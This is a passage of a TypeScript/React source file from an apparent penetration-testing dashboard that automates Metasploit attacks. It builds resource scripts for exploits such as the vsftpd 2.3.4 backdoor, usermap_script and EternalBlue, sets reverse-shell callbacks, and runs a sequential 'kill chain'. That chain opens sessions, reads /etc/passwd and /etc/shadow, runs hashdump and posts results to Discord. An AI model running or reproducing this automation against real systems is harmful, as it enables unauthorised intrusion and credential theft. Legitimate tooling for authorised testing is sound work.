          executor: 'msfconsole',
          extra_fields: [
            { name: 'üìù Commands', value: `\`${msfCmdList.length}\` commands queued`, inline: true },
          ],
        })
        toast.success('Metasploit execution complete')
      } else {
        setMsfOutput(prev => prev + `[ERROR] ${result.error}\n`)
        sendDiscordNotification({
          attack_type: 'metasploit',
          status: 'failure',
          execution_id: `msf_${Date.now()}`,
          target_ip: config.target_ip || agentConfig.ssh_host,
          target_port: parseInt(config.target_port) || undefined,
          module: msfCmdList.find(c => c.startsWith('use '))?.replace('use ', '') || 'Metasploit RC Script',
          command: msfCmdList.join('\n'),
          output: result.error,
          executor: 'msfconsole',
        })
        toast.error('MSF execution failed')
      }
    } catch (error) {
      setMsfOutput(prev => prev + `[ERROR] Failed to execute MSF commands\n`)
      sendDiscordNotification({
        attack_type: 'metasploit',
        status: 'failure',
        execution_id: `msf_${Date.now()}`,
        target_ip: config.target_ip || agentConfig.ssh_host,
        module: 'Metasploit RC Script',
        command: msfCmdList.join('\n'),
        output: error instanceof Error ? error.message : 'Connection failed',
        executor: 'msfconsole',
      })
    } finally {
      setIsMsfRunning(false)
    }
  }

  // ‚îÄ‚îÄ Auto-generate MSF commands from selected exploit ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const loadExploitToMsf = (exploit: SuggestedExploit) => {
    if (!exploit.module_path || exploit.source === 'searchsploit') {
      toast.error('This exploit does not have a direct MSF module path')
      return
    }
    const cmds: string[] = [
      `use ${exploit.module_path}`,
      `set RHOSTS ${config.target_ip}`,
      `set RHOST ${config.target_ip}`,
      `set RPORT ${exploit.port || config.target_port}`,
      `set LHOST ${config.lhost}`,
      `set LPORT ${config.lport}`,
    ]
    if (exploit.payload) cmds.push(`set PAYLOAD ${exploit.payload}`)
    if (exploit.options) {
      Object.entries(exploit.options).forEach(([k, v]) => {
        cmds.push(`set ${k} ${v}`)
      })
    }
    cmds.push('show options')
    cmds.push('exploit -j -z')
    cmds.push('sleep 15')
    cmds.push('sessions -l')

    setMsfCommands(cmds)
    setAttackTab('metasploit')
    toast.success(`Loaded ${exploit.module_path} into MSF console`)
  }

  const getOsIcon = (osType: string) => {
    switch (osType) {
      case 'linux': return 'üêß'
      case 'windows': return 'ü™ü'
      default: return 'üíª'
    }
  }

  const getOsBadgeClass = (osType: string) => {
    switch (osType) {
      case 'linux': return 'bg-neon-green/20 text-neon-green border-neon-green/30'
      case 'windows': return 'bg-cyber-cyan/20 text-cyber-cyan border-cyber-cyan/30'
      default: return 'bg-slate/20 text-slate border-slate/30'
    }
  }

  const getConfidenceBadge = (confidence: string) => {
    switch (confidence) {
      case 'high': return 'bg-neon-green/20 text-neon-green border-neon-green/40'
      case 'medium': return 'bg-neon-yellow/20 text-neon-yellow border-neon-yellow/40'
      case 'low': return 'bg-slate/20 text-slate border-slate/40'
      default: return 'bg-slate/20 text-slate border-slate/40'
    }
  }

  const getSourceBadge = (source: string) => {
    switch (source) {
      case 'built-in': return 'bg-cyber-purple/20 text-cyber-purple border-cyber-purple/40'
      case 'searchsploit': return 'bg-cyber-cyan/20 text-cyber-cyan border-cyber-cyan/40'
      case 'nmap-scripts': return 'bg-neon-yellow/20 text-neon-yellow border-neon-yellow/40'
      default: return 'bg-slate/20 text-slate border-slate/40'
    }
  }

  // ‚îÄ‚îÄ Execute Kill Chain ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const executeKillChain = async () => {
    if (killChain.enumeration.selectedHosts.length === 0) {
      toast.error('Please select at least one host in Enumeration')
      return
    }
    if (killChain.weaponization.selectedAttacks.length === 0) {
      toast.error('Please select at least one attack in Weaponization')
      return
    }
    if (!agentConfig.ssh_host || !agentConfig.ssh_user || !agentConfig.ssh_password) {
      toast.error('Agent SSH credentials not configured')
      return
    }

    setIsKillChainRunning(true)
    setKillChainOutput('')
    const outputLines: string[] = []
    
    const appendOutput = (text: string) => {
      outputLines.push(text)
      setKillChainOutput(outputLines.join('\n'))
      if (killChainTerminalRef.current) {
        killChainTerminalRef.current.scrollTop = killChainTerminalRef.current.scrollHeight
      }
    }

    appendOutput('='.repeat(60))
    appendOutput('KILL CHAIN EXECUTION STARTED')
    appendOutput('='.repeat(60))
    appendOutput('')

    try {
      const targetHost = killChain.enumeration.selectedHosts[0]
      // Use post-exploitation OS type if set, otherwise use target host OS type
      const osType = killChain.postExploitation.osType !== 'unknown' 
        ? killChain.postExploitation.osType 
        : (targetHost.os_type !== 'unknown' ? targetHost.os_type : 'linux')
      
      appendOutput(`[ENUMERATION] Target: ${targetHost.ip} (${osType})`)
      appendOutput(`[ENUMERATION] Ports: ${targetHost.ports.join(', ')}`)
      appendOutput(`[ENUMERATION] OS Type: ${osType}`)
      appendOutput('')

      // Execute weaponization attacks sequentially until one succeeds
      let successfulAttack: SuggestedExploit | null = null
      let sessionId: string | null = null
      let currentLport = parseInt(config.lport)

      appendOutput('='.repeat(60))
      appendOutput('[WEAPONIZATION] Starting sequential attack execution via Agent...')
      appendOutput('='.repeat(60))
      appendOutput('')

      for (let i = 0; i < killChain.weaponization.selectedAttacks.length; i++) {
        const attack = killChain.weaponization.selectedAttacks[i]
        appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Attempting: ${attack.name}`)
        appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Target: ${targetHost.ip}:${attack.port}`)
        appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Module: ${attack.module_path}`)
        appendOutput('')

        // Build Metasploit RC commands
        const msfCommands: string[] = []
        msfCommands.push(`use ${attack.module_path}`)
        msfCommands.push(`set RHOSTS ${targetHost.ip}`)
        msfCommands.push(`set RHOST ${targetHost.ip}`)
        msfCommands.push(`set RPORT ${attack.port}`)
        msfCommands.push(`set LHOST ${config.lhost}`)
        msfCommands.push(`set LPORT ${currentLport}`)
        
        if (attack.payload) {
          msfCommands.push(`set PAYLOAD ${attack.payload}`)
        }
        
        // Add custom options if any
        if (attack.options) {
          Object.entries(attack.options).forEach(([key, value]) => {
            msfCommands.push(`set ${key} ${value}`)
          })
        }
        
        msfCommands.push('show options')
        msfCommands.push('exploit -j -z')
        msfCommands.push('sleep 5')  // Reduced from 15s to 5s - enough time for exploit to initialize
        
        // Special handling for vsftpd 2.3.4 backdoor
        if (attack.module_path.includes('vsftpd_234')) {
          msfCommands.push('# vsftpd 2.3.4 creates backdoor on port 6200')
          msfCommands.push('sleep 5')
          msfCommands.push('# Connect to the backdoor directly')
          msfCommands.push('connect ' + targetHost.ip + ' 6200')
          msfCommands.push('sleep 2')
          msfCommands.push('# Try to get basic info')
          msfCommands.push('id')
          msfCommands.push('sleep 1')
          msfCommands.push('cat /etc/passwd')
          msfCommands.push('sleep 1')
          msfCommands.push('uname -a')
          msfCommands.push('sleep 1')
          msfCommands.push('exit')
        } else {
          msfCommands.push('sessions -l')
        }
        
        // If post-exploitation modules are selected, add them to the SAME msfconsole session
        // This ensures the session is available when post-exploitation runs
        if (killChain.postExploitation.selectedModules.length > 0 && !attack.module_path.includes('vsftpd_234')) {
          msfCommands.push('sleep 2') // Give sessions more time to establish
          msfCommands.push('# === Post-Exploitation Basic Commands ===')
          msfCommands.push('# Get basic info from the session first')
          msfCommands.push('sessions -l')
          msfCommands.push('sleep 1')
          msfCommands.push('sessions -i 1')
          msfCommands.push('sleep 2')
          
          // Add basic commands based on OS type
          if (osType === 'linux') {
            msfCommands.push('shell')
            msfCommands.push('sleep 1')
            msfCommands.push('id')
            msfCommands.push('sleep 1')
            msfCommands.push('cat /etc/passwd')
            msfCommands.push('sleep 1')
            msfCommands.push('uname -a')
            msfCommands.push('sleep 1')
            msfCommands.push('exit')
          } else if (osType === 'windows') {
            msfCommands.push('getuid')
            msfCommands.push('sleep 1')
            msfCommands.push('sysinfo')
            msfCommands.push('sleep 1')
            msfCommands.push('hostname')
          }
          
          msfCommands.push('background')
          msfCommands.push('sleep 1')
          msfCommands.push('# === Post-Exploitation Modules ===')
          
          // Re-check sessions before running modules
          msfCommands.push('sessions -l')
          msfCommands.push('sleep 1')
          
          // Special handling for vsftpd 2.3.4 post-exploitation modules
          if (killChain.postExploitation.selectedModules.length > 0 && attack.module_path.includes('vsftpd_234')) {
            msfCommands.push('# === Post-Exploitation Modules for vsftpd ===')
            msfCommands.push('# Reconnect to backdoor for post-exploitation')
            msfCommands.push('connect ' + targetHost.ip + ' 6200')
            msfCommands.push('sleep 2')
            
            for (let j = 0; j < killChain.postExploitation.selectedModules.length; j++) {
              const mod = killChain.postExploitation.selectedModules[j]
              msfCommands.push(`# Module ${j + 1}/${killChain.postExploitation.selectedModules.length}: ${mod.name}`)
              
              if (mod.module.includes('hashdump')) {
                msfCommands.push('# Manual hash extraction for vsftpd backdoor')
                msfCommands.push('cat /etc/shadow 2>/dev/null || echo "No access to shadow file"')
                msfCommands.push('sleep 1')
                msfCommands.push('cat /etc/passwd')
                msfCommands.push('sleep 1')
              }
            }
            
            msfCommands.push('exit')
          }
          
          for (let j = 0; j < killChain.postExploitation.selectedModules.length; j++) {
            const mod = killChain.postExploitation.selectedModules[j]
            msfCommands.push(`# Module ${j + 1}/${killChain.postExploitation.selectedModules.length}: ${mod.name}`)
            msfCommands.push(`use ${mod.module}`)
            
            // For hashdump and similar modules, we need to ensure we have the right session type
            if (mod.module.includes('hashdump')) {
              // Hashdump works better with meterpreter sessions
              if (osType === 'linux') {
                // Special handling for vsftpd 2.3.4 backdoor which creates a shell session
                if (attack.module_path && attack.module_path.includes('vsftpd_234')) {
                  msfCommands.push('# vsftpd 2.3.4 creates a shell session - try manual hash extraction')
                  msfCommands.push('sessions -i 1')
                  msfCommands.push('sleep 1')
                  msfCommands.push('shell')
                  msfCommands.push('sleep 1')
                  msfCommands.push('cat /etc/shadow 2>/dev/null || echo "No access to shadow file"')
                  msfCommands.push('sleep 1')
                  msfCommands.push('cat /etc/passwd')
                  msfCommands.push('sleep 1')
                  msfCommands.push('exit')
                  msfCommands.push('sleep 1')
                  msfCommands.push('background')
                } else {
                  // Try the standard hashdump module first
                  msfCommands.push('set SESSION 1')
                  msfCommands.push('show options')
                  msfCommands.push('run')
                  msfCommands.push('sleep 3')
                  
                  // Also try manual hash extraction if hashdump fails
                  msfCommands.push('# Manual hash extraction fallback')
                  msfCommands.push('sessions -i 1')
                  msfCommands.push('sleep 1')
                  msfCommands.push('shell')
                  msfCommands.push('sleep 1')
                  msfCommands.push('cat /etc/shadow 2>/dev/null || echo "No access to shadow file"')
                  msfCommands.push('sleep 1')
                  msfCommands.push('exit')
                  msfCommands.push('sleep 1')
                  msfCommands.push('background')
                }
              } else if (osType === 'windows') {
                msfCommands.push('set SESSION 1')
                msfCommands.push('show options')
                msfCommands.push('run')
                msfCommands.push('sleep 3')
              }
            } else {
              // For other modules, use session 1
              msfCommands.push('set SESSION 1')
              msfCommands.push('show options')
              msfCommands.push('run')
              msfCommands.push('sleep 2')
            }
            
            // Check session status between modules
            msfCommands.push('sessions -l')
            msfCommands.push('sleep 1')
          }
        } else {
          // Even if no modules selected, run basic commands for session validation
          msfCommands.push('sleep 2')
          msfCommands.push('# === Basic Session Validation ===')
          msfCommands.push('sessions -l')
          msfCommands.push('sleep 1')
          msfCommands.push('sessions -i 1')
          msfCommands.push('sleep 2')
          
          if (osType === 'linux') {
            msfCommands.push('shell')
            msfCommands.push('sleep 1')
            msfCommands.push('id')
            msfCommands.push('sleep 1')
            msfCommands.push('cat /etc/passwd')
            msfCommands.push('sleep 1')
            msfCommands.push('exit')
          } else if (osType === 'windows') {
            msfCommands.push('getuid')
            msfCommands.push('sleep 1')
            msfCommands.push('hostname')
          }
          
          msfCommands.push('background')
        }

        appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Executing via Agent SSH...`)
        appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Commands: ${msfCommands.length} MSF commands`)
        appendOutput('')

        try {
          const response = await fetch('/api/agent/execute-command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              ...agentConfig,
              command: '',
              is_msf: true,
              msf_commands: msfCommands,
              timeout: 180000, // 3 minutes (reduced from 10 minutes) - optimized for faster execution
            }),
          })

          if (!response.ok) {
            appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] ‚úó HTTP Error: ${response.status} ${response.statusText}`)
            appendOutput('')
            continue
          }

          const result = await response.json()
          
          if (result.success) {
            appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Execution completed`)
            
            // Check if we have output
            if (!result.output || result.output.trim() === '') {
              appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] ‚ö† WARNING: No output received`)
              appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] [DEBUG] stderr: ${result.stderr || 'none'}`)
              appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] [DEBUG] exit_code: ${result.exit_code || 'unknown'}`)
              appendOutput('')
              // Continue to next attack even without output
              continue
            }
            
            appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Output:`)
            appendOutput(result.output)
            appendOutput('')

            // Check for session creation in output
            const output = result.output || ''
            
            // Special handling for vsftpd 2.3.4 backdoor - check for direct connection output
            if (attack.module_path.includes('vsftpd_234')) {
              // Check if we got output from the direct connection to port 6200
              if (output.includes('uid=') && output.includes('root:x:0:0')) {
                sessionId = 'vsftpd_backdoor'
                successfulAttack = attack
                appendOutput('')
                appendOutput('='.repeat(60))
                appendOutput('[‚úì] VSFTPD 2.3.4 BACKDOOR CONNECTED SUCCESSFULLY!')
                appendOutput('[‚úì] Direct connection to port 6200 established')
                appendOutput(`[‚úì] Attack: ${attack.name}`)
                appendOutput(`[‚úì] Target: ${targetHost.ip}:${attack.port}`)
                appendOutput('='.repeat(60))
                appendOutput('')
                
                // Check for post-exploitation output
                if (killChain.postExploitation.selectedModules.length > 0) {
                  const postExStart = output.indexOf('# === Post-Exploitation Modules for vsftpd ===')
                  if (postExStart !== -1) {
                    const postExOutput = output.substring(postExStart)
                    appendOutput('[POST-EXPLOITATION] Results:')
                    appendOutput(postExOutput)
                    appendOutput('')
                    
                    for (let j = 0; j < killChain.postExploitation.selectedModules.length; j++) {
                      const mod = killChain.postExploitation.selectedModules[j]
                      const moduleMarker = `# Module ${j + 1}/${killChain.postExploitation.selectedModules.length}: ${mod.name}`
                      const moduleIndex = postExOutput.indexOf(moduleMarker)
                      
                      if (moduleIndex !== -1) {
                        const nextMarker = postExOutput.indexOf(`# Module ${j + 2}/`, moduleIndex + moduleMarker.length)
                        const moduleOutput = postExOutput.substring(moduleIndex, nextMarker !== -1 ? nextMarker : postExOutput.length)
                        
                        if (moduleOutput.includes('failed to validate') || moduleOutput.includes('OptionValidateError')) {
                          appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] ‚úó ${mod.name}: Session validation failed`)
                          appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] [INFO] This may be because session ${sessionId} was used but session 1 was set`)
                        } else if (moduleOutput.includes('Post module execution completed') || moduleOutput.includes('Loot saved')) {
                          appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] ‚úì ${mod.name}: Success`)
                        } else {
                          appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] ${mod.name}: Completed`)
                        }
                      }
                    }
                  }
                } else {
                  appendOutput('[WARNING] Post-exploitation output not found in execution results')
                }
                appendOutput('')
              } else {
                appendOutput('[‚Üí] No post-exploitation modules selected')
                appendOutput('')
              }
              
              break
            }
            
            // Check for "Meterpreter session X opened" pattern (most reliable)
            const sessionOpenedMatch = output.match(/Meterpreter session (\d+) opened|session (\d+) opened/i)
            if (sessionOpenedMatch && !sessionId) {
              // Get the first session ID (usually the first one created)
              // But also check sessions table for all sessions
              const allSessionMatches = output.matchAll(/Meterpreter session (\d+) opened/gi)
              const sessionIds: string[] = []
              for (const match of allSessionMatches) {
                sessionIds.push(match[1])
              }
              
              // Use the first session ID (session 1 is usually first)
              sessionId = sessionIds[0] || sessionOpenedMatch[1] || sessionOpenedMatch[2]
              successfulAttack = attack
              appendOutput('')
              appendOutput('='.repeat(60))
              appendOutput(`[‚úì] SESSION ${sessionId} OPENED SUCCESSFULLY!`)
              if (sessionIds.length > 1) {
                appendOutput(`[INFO] Multiple sessions created: ${sessionIds.join(', ')} - using first session`)
              }
              appendOutput(`[‚úì] Attack: ${attack.name}`)
              appendOutput(`[‚úì] Target: ${targetHost.ip}:${attack.port}`)
              appendOutput('='.repeat(60))
              appendOutput('')
              
              // Handle post-exploitation if modules are selected
              if (killChain.postExploitation.selectedModules.length > 0) {
                const postExStart = output.indexOf('# === Post-Exploitation Modules ===')
                if (postExStart !== -1) {
                  const postExOutput = output.substring(postExStart)
                  
                  for (let j = 0; j < killChain.postExploitation.selectedModules.length; j++) {
                    const mod = killChain.postExploitation.selectedModules[j]
                    const moduleMarker = `# Module ${j + 1}/${killChain.postExploitation.selectedModules.length}: ${mod.name}`
                    const moduleIndex = postExOutput.indexOf(moduleMarker)
                    
                    if (moduleIndex !== -1) {
                      const nextMarker = postExOutput.indexOf(`# Module ${j + 2}/`, moduleIndex + moduleMarker.length)
                      const moduleOutput = postExOutput.substring(moduleIndex, nextMarker !== -1 ? nextMarker : postExOutput.length)
                      
                      if (moduleOutput.includes('failed to validate') || moduleOutput.includes('OptionValidateError')) {
                        appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] ‚úó ${mod.name}: Session validation failed`)
                        appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] [INFO] This may be because session ${sessionId} was used but session 1 was set`)
                      } else if (moduleOutput.includes('Post module execution completed') || moduleOutput.includes('Loot saved')) {
                        appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] ‚úì ${mod.name}: Success`)
                      } else {
                        appendOutput(`[POST-EX ${j + 1}/${killChain.postExploitation.selectedModules.length}] ${mod.name}: Completed`)
                      }
                    }
                  }
                } else {
                  appendOutput('[WARNING] Post-exploitation output not found in execution results')
                }
                appendOutput('')
              } else {
                appendOutput('[‚Üí] No post-exploitation modules selected')
                appendOutput('')
              }
              
              break
            }
            
            // Check for Active sessions table (format: "1         meterpreter x86/linux")
            const activeSessionsMatch = output.match(/Active sessions[\s\S]*?(\d+)\s+\S*\s+(\S+)\s+(\S+)/)
            if (activeSessionsMatch && !output.includes('No active sessions')) {
              sessionId = activeSessionsMatch[1]
              successfulAttack = attack
              appendOutput('')
              appendOutput('='.repeat(60))
              appendOutput(`[‚úì] SESSION ${sessionId} DETECTED IN SESSIONS TABLE!`)
              appendOutput(`[‚úì] Session Type: ${activeSessionsMatch[3]}`)
              appendOutput(`[‚úì] Attack: ${attack.name}`)
              appendOutput(`[‚úì] Target: ${targetHost.ip}:${attack.port}`)
              appendOutput('='.repeat(60))
              appendOutput('')
              appendOutput('[‚Üí] Proceeding to Post-Exploitation phase...')
              appendOutput('')
              break
            }
            
            // Check for "No active sessions" or similar
            if (output.includes('No active sessions') || output.includes('Exploit completed, but no session was created')) {
              appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] ‚úó No session created, trying next attack...`)
              appendOutput('')
            } else {
              // Try to find any session pattern as fallback
              const anySessionMatch = output.match(/session\s+(\d+)\s+opened|Session\s+(\d+)/i)
              if (anySessionMatch) {
                sessionId = anySessionMatch[1] || anySessionMatch[2]
                successfulAttack = attack
                appendOutput('')
                appendOutput('='.repeat(60))
                appendOutput(`[‚úì] SESSION ${sessionId} DETECTED!`)
                appendOutput(`[‚úì] Attack: ${attack.name}`)
                appendOutput('='.repeat(60))
                appendOutput('')
                appendOutput('[‚Üí] Proceeding to Post-Exploitation phase...')
                appendOutput('')
                break
              } else {
                appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] ‚úó Attack completed but no session detected, trying next...`)
                appendOutput('')
              }
            }
          } else {
            appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] ‚úó Execution failed`)
            appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] Error: ${result.error || 'Unknown error'}`)
            if (result.stderr) {
              appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] stderr: ${result.stderr.substring(0, 500)}`)
            }
            appendOutput('')
          }
        } catch (error) {
          appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] ‚úó Network/Execution Error`)
          appendOutput(`[${i + 1}/${killChain.weaponization.selectedAttacks.length}] ${error instanceof Error ? error.message : 'Unknown error'}`)
          appendOutput('')
        }

        // Increment LPORT for next attempt
        currentLport++
      }

      if (!successfulAttack || !sessionId) {
        appendOutput('')
        appendOutput('='.repeat(60))
        appendOutput('[FAILED] All weaponization attacks failed - no session created')
        appendOutput('='.repeat(60))
        setIsKillChainRunning(false)
        toast.error('All weaponization attacks failed')
        return
      }

      // Post-exploitation is now handled immediately after session detection above
      // This section is kept for cases where post-exploitation wasn't run yet
      if (sessionId && killChain.postExploitation.selectedModules.length > 0) {
        // Check if post-exploitation was already run (it should have been)
        // If not, run it here as fallback
        appendOutput('')
        appendOutput('[INFO] Post-exploitation should have run automatically after session creation')
        appendOutput('')
      } else if (sessionId && killChain.postExploitation.selectedModules.length === 0) {
        appendOutput('')
        appendOutput('[INFO] No post-exploitation modules selected - skipping post-exploitation phase')
        appendOutput('')
      }

      // Lateral Movement
      if (killChain.lateralMovement.selectedModules.length > 0 && sessionId) {
        appendOutput('')
        appendOutput('='.repeat(60))
        appendOutput('[LATERAL MOVEMENT] Starting lateral movement...')
        appendOutput('='.repeat(60))
        appendOutput('')
        // TODO: Implement lateral movement execution
        appendOutput('[INFO] Lateral movement modules selected but execution not yet implemented')
      }

      appendOutput('')
      appendOutput('='.repeat(60))
      appendOutput('KILL CHAIN EXECUTION COMPLETED')
      appendOutput('='.repeat(60))

      toast.success('Kill chain execution completed')
    } catch (error) {
      appendOutput('')
      appendOutput('='.repeat(60))
      appendOutput('[ERROR] Kill chain execution failed')
      appendOutput(`[ERROR] ${error instanceof Error ? error.message : 'Unknown error'}`)
      appendOutput('='.repeat(60))
      toast.error('Kill chain execution failed')
    } finally {
      setIsKillChainRunning(false)
    }
  }

  // ‚îÄ‚îÄ Execute Attack (Tab-aware) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
  const executeAttack = async () => {
    // If in kill chain tab, execute kill chain
    if (attackTab === 'killchain') {
      return executeKillChain()
    }

    // Otherwise, execute normal attack (suggested/custom/metasploit)
    if (!config.target_ip) {
      toast.error('Target IP is required')
      return
    }

    const executionId = `exec_${Date.now()}`
    const moduleName = selectedExploit?.module_path || config.attack_module

    setExecutionHistory(prev => [{
      id: executionId,
      timestamp: new Date().toISOString(),
      status: 'running',
      target: config.target_ip,
      module: moduleName,
    }, ...prev])

    setIsLoading(true)
    setLoadingMessage(`Executing ${mode} attack on ${config.target_ip}...`)

    try {
      // Try direct agent execution first (more reliable)
      const msfCommands = []
      
      // Build MSF commands dynamically
      msfCommands.push(`use ${moduleName}`)
      msfCommands.push(`set RHOSTS ${config.target_ip}`)
      msfCommands.push(`set RHOST ${config.target_ip}`)
      msfCommands.push(`set RPORT ${config.target_port}`)
      msfCommands.push(`set LHOST ${config.lhost}`)
      msfCommands.push(`set LPORT ${config.lport}`)
      
      // Set payload if provided
      if (selectedExploit?.payload) {
        msfCommands.push(`set PAYLOAD ${selectedExploit.payload}`)
      }
      
      // Set custom options if provided
      if (selectedExploit?.options && typeof selectedExploit.options === 'object') {
        Object.keys(selectedExploit.options).forEach(key => {
          msfCommands.push(`set ${key} ${selectedExploit.options[key]}`)
        })
      }
      
      // Add exploit-specific options
      if (moduleName.includes('usermap_script')) {
        msfCommands.push('set SMB::AlwaysEncrypt false')
        msfCommands.push('set SMB::ProtocolVersion 1')
      }
      if (moduleName.includes('postgres')) {
        msfCommands.push('set DATABASE template1')
        msfCommands.push('set USERNAME postgres')
        msfCommands.push('set PASSWORD postgres')
      }
      if (moduleName.includes('ms17_010') || moduleName.toLowerCase().includes('eternalblue')) {
        msfCommands.push('set TARGET 0')
      }
      if (moduleName.includes('vsftpd_234')) {
        // vsftpd 2.3.4 backdoor connects to port 6200, need to handle differently
        msfCommands.push('set RPORT 21')
        msfCommands.push('set RHOSTS ' + config.target_ip)
        // Don't set LHOST/LPORT for vsftpd - it uses port 6200 backdoor
      }
      
      msfCommands.push('show options')
      msfCommands.push('exploit -j -z')
      msfCommands.push('sleep 10')  // Give exploit time to work
      
      // Special handling for vsftpd 2.3.4 backdoor
      if (moduleName.includes('vsftpd_234')) {
        msfCommands.push('# vsftpd 2.3.4 creates backdoor on port 6200')
        msfCommands.push('sleep 5')
        msfCommands.push('# Connect to the backdoor directly')
        msfCommands.push('connect ' + config.target_ip + ' 6200')
        msfCommands.push('sleep 2')
        msfCommands.push('# Try to get basic info')
        msfCommands.push('id')
        msfCommands.push('sleep 1')
        msfCommands.push('cat /etc/passwd')
        msfCommands.push('sleep 1')
        msfCommands.push('uname -a')
        msfCommands.push('sleep 1')
        msfCommands.push('exit')
      } else {
        // Standard session handling for other exploits
        msfCommands.push('sessions -l')
        msfCommands.push('sleep 2')
        msfCommands.push('sessions -i 1')
        msfCommands.push('sleep 2')
        
        // Add basic post-exploitation for non-vsftpd exploits
        if (config.selected_host_os_type === 'linux') {
          msfCommands.push('shell')
          msfCommands.push('sleep 1')
          msfCommands.push('id')
          msfCommands.push('sleep 1')
          msfCommands.push('cat /etc/passwd')
          msfCommands.push('sleep 1')
          msfCommands.push('uname -a')
          msfCommands.push('sleep 1')
          msfCommands.push('exit')
        } else if (config.selected_host_os_type === 'windows') {
          msfCommands.push('getuid')
          msfCommands.push('sleep 1')
          msfCommands.push('sysinfo')
          msfCommands.push('sleep 1')
          msfCommands.push('hostname')
        }
        
        msfCommands.push('background')
      }
      msfCommands.push('sessions -K')
      msfCommands.push('exit -y')

      const response = await fetch('/api/agent/execute-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...agentConfig,
          command: '',
          is_msf: true,
          msf_commands: msfCommands,
          timeout: 180000, // 3 minutes
        }),
      })

      if (response.ok) {
        const result = await response.json()
        
        // Parse session information from output
        let sessionId = null
        const output = result.output || ''
        
        // Enhanced session detection
        const sessionPatterns = [
          /Meterpreter session (\d+) opened/gi,
          /Command shell session (\d+) opened/gi,
          /Session (\d+) opened/gi,
          /Session (\d+) created/gi
        ]
        
        for (const pattern of sessionPatterns) {
          const matches = [...output.matchAll(pattern)]
          if (matches.length > 0) {
            sessionId = matches[0][1]
            break
          }
        }
        
        // Check for shell indicators
        if (!sessionId && (output.includes('uid=') || output.includes('root@') || output.includes('C:\\'))) {
          sessionId = '1'
        }

        setExecutionHistory(prev => prev.map(h =>
          h.id === executionId ? { 
            ...h, 
            status: sessionId ? 'success' : 'completed', 
            output: result.output || '',
            session_id: sessionId
          } : h
        ))

        addAttackResult({
          execution_id: executionId,
          attack_type: mode,
          timestamp: new Date().toISOString(),
          target_ip: config.target_ip,
          target_port: parseInt(config.target_port),
          raw_output: result.output || '',
          success: !!sessionId,
          session_id: sessionId,
          os_type: config.selected_host_os_type,
        })

        addNotification({
          id: `notif_${Date.now()}`,
          type: sessionId ? 'success' : 'warning',
          title: sessionId ? 'Attack Successful' : 'Attack Completed',
          message: `${mode} attack ${sessionId ? 'established session' : 'completed'} on ${config.target_ip}`,
          timestamp: new Date().toISOString(),
        })

        // Send Discord notification
        sendDiscordNotification({
          attack_type: mode,
          status: sessionId ? 'success' : 'partial',
          execution_id: executionId,
          target_ip: config.target_ip,
          target_port: parseInt(config.target_port),
          module: moduleName,
          output: result.output,
          os_type: config.selected_host_os_type,
          extra_fields: [
            { name: 'üñ•Ô∏è Target OS', value: config.selected_host_os || 'Unknown', inline: true },
            ...(sessionId ? [{ name: 'üîì Session ID', value: sessionId, inline: true }] : []),
            ...(selectedExploit ? [
              { name: 'üí£ Exploit', value: selectedExploit.name || selectedExploit.module_path, inline: true },
              { name: 'üéØ Confidence', value: selectedExploit.confidence?.toUpperCase() || 'N/A', inline: true },
            ] : []),
            { name: 'üì° Callback', value: `${config.lhost}:${config.lport}`, inline: true },
          ],
        })

        toast.success(sessionId ? `Attack successful! Session ${sessionId} established` : 'Attack execution completed')
      } else {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`)
      }
    } catch (error) {
      console.error('Direct agent execution failed:', error)
      
      // Fallback to n8n webhook if direct execution fails
      try {
        const webhookUrl = `${n8nConfig.base_url}${n8nConfig.webhook_pentest}`

        const payload = {
          execution_id: executionId,
